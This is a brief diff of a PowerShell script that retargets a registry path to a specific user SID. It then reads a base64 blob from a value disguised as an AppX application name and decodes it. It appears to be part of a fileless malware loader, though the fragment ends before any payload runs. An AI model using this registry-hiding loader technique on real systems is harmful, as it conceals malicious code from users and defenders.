@@ -1,4 +1,4 @@
-$rk = "HKCU:\Software\RegisteredApplications"
+$rk = "HKU:\S-1-5-21-3921924719-2751751025-4067464375-1003\Software\RegisteredApplications"
 $rv = "AppXs42fd12c3po92dynnq2r142fs12qhvsmyy"
 $p = (gp -Path $rk -Name $rv).$rv
 $CompBytes = [System.Convert]::FromBase64String($p)
